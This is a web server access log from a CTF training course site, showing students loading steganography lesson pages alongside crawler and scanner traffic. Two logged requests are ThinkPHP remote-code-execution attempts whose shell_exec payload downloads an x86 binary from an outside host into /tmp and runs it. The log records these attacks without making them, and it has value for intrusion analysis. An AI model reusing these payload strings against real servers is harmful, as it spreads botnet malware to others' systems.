12.240.32.81 - - [15/May/2022:00:00:19 +0300] "GET /f2035be396/c7e9d9807d/5401 HTTP/1.1" 301 162 "-" "-"
253.58.53.124 - - [15/May/2022:00:00:21 +0300] "GET /770b3b5663/7fced90f8e/3603 HTTP/1.1" 301 162 "-" "curl/7.47.0"
14.248.151.140 - - [15/May/2022:00:00:23 +0300] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\x8D'T\xAF\xBB\x15\xEC\xE0\xE3 \xCD\xCE\x8B\x14\xEC\xE3Z\x92\x94\x8B\xA1\x91\xEE\xF7jj\xD6\xF82\xF1_\x9C \x19\x06\xF2\xDB\x83\x8C_\xA4 \xBDj\x7F-\x9F\xB6e\xC6y\xF1H\xCD*\xEBs\x83+\xB0\x82\xA6\x8E\xBCR\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
171.6.31.72 - - [15/May/2022:00:00:50 +0300] "GET / HTTP/1.1" 301 162 "-" "curl/7.47.0"
157.78.252.166 - - [15/May/2022:00:00:52 +0300] "GET / HTTP/1.1" 301 162 "-" "curl/7.47.0"
153.197.30.73 - - [15/May/2022:00:00:53 +0300] "GET / HTTP/1.1" 200 415 "-" "curl/7.47.0"
139.104.172.100 - - [15/May/2022:00:00:57 +0300] "GET /streaming/clients_live.php?username=9cbee56c66&password=f9a6ab7d75&stream=7881?extension=ts HTTP/1.1" 301 162 "-" "-"
234.82.247.190 - - [15/May/2022:00:00:57 +0300] "GET /b84559f2aa/0daeb36967/7818 HTTP/1.1" 301 162 "-" "-"
128.91.215.100 - - [15/May/2022:00:00:57 +0300] "GET /1yQaFJBjloLo37JanVBKFj87 HTTP/1.1" 301 162 "-" "-"
187.41.135.121 - - [15/May/2022:00:04:09 +0300] "GET /stegano/audio.html HTTP/2.0" 200 14759 "https://course.ugractf.ru/stegano/pictures.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
189.179.59.192 - - [15/May/2022:00:04:09 +0300] "GET /stegano/pic/aphex_twin.svg HTTP/2.0" 200 16737 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
222.98.145.192 - - [15/May/2022:00:04:09 +0300] "GET /stegano/pic/audacity_settings.png HTTP/2.0" 200 76391 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
73.175.46.14 - - [15/May/2022:00:04:09 +0300] "GET /stegano/spectrogram/ HTTP/2.0" 200 1025 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
186.56.80.63 - - [15/May/2022:00:04:09 +0300] "GET /stegano/pic/lena_spectrogram.png HTTP/2.0" 200 296101 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
210.85.150.133 - - [15/May/2022:00:04:10 +0300] "GET /stegano/files/never_gonna_give_you_up.mp3 HTTP/2.0" 206 253566 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
178.199.23.185 - - [15/May/2022:00:04:10 +0300] "GET /stegano/pic/riding_the_wave.png HTTP/2.0" 200 383735 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
222.0.158.224 - - [15/May/2022:00:04:10 +0300] "GET /stegano/spectrogram/spectrogram.js HTTP/2.0" 200 5495 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
96.151.166.29 - - [15/May/2022:00:04:10 +0300] "GET /stegano/spectrogram/lena.png HTTP/2.0" 200 88235 "https://course.ugractf.ru/stegano/spectrogram/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
161.205.51.33 - - [15/May/2022:00:04:47 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://51.81.133.91/FKKK/NW_BBB.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
225.166.217.81 - - [15/May/2022:00:09:39 +0300] "GET / HTTP/1.1" 200 415 "-" "SiteCheckerBotCrawler/1.0 (+http://sitechecker.pro)"
65.195.241.146 - - [15/May/2022:00:10:04 +0300] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
83.79.43.58 - - [15/May/2022:00:10:05 +0300] "GET /robots.txt HTTP/1.1" 404 232 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
230.202.202.38 - - [15/May/2022:00:12:43 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://payload.krakenbit.net/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 -O /tmp/.db0fa4b8db0333367e9bda3ab68b8042; chmod 777 /tmp/.db0fa4b8db0333367e9bda3ab68b8042; /tmp/.db0fa4b8db0333367e9bda3ab68b8042 thinkphp' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
103.229.246.117 - - [15/May/2022:00:12:54 +0300] "GET /stegano/task-a.html HTTP/2.0" 200 1942 "https://course.ugractf.ru/stegano/audio.html" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
34.205.132.147 - - [15/May/2022:00:12:55 +0300] "GET /tasks/allfields/flag_iframe HTTP/2.0" 303 234 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
161.225.146.19 - - [15/May/2022:00:12:55 +0300] "GET /signup_iframe HTTP/2.0" 200 1626 "https://course.ugractf.ru/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
139.78.195.31 - - [15/May/2022:00:12:55 +0300] "GET /static/book.css HTTP/2.0" 200 2501 "https://board.course.ugractf.ru/signup_iframe" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
73.6.252.173 - - [15/May/2022:00:12:55 +0300] "GET /static/book-nav.css HTTP/2.0" 200 3893 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
30.248.194.253 - - [15/May/2022:00:12:55 +0300] "GET /static/book-misc.css HTTP/2.0" 200 1675 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
119.58.131.189 - - [15/May/2022:00:12:55 +0300] "GET /static/book-text.css HTTP/2.0" 200 3409 "https://board.course.ugractf.ru/static/book.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 YaBrowser/22.3.3.855 Yowser/2.5 Safari/537.36"
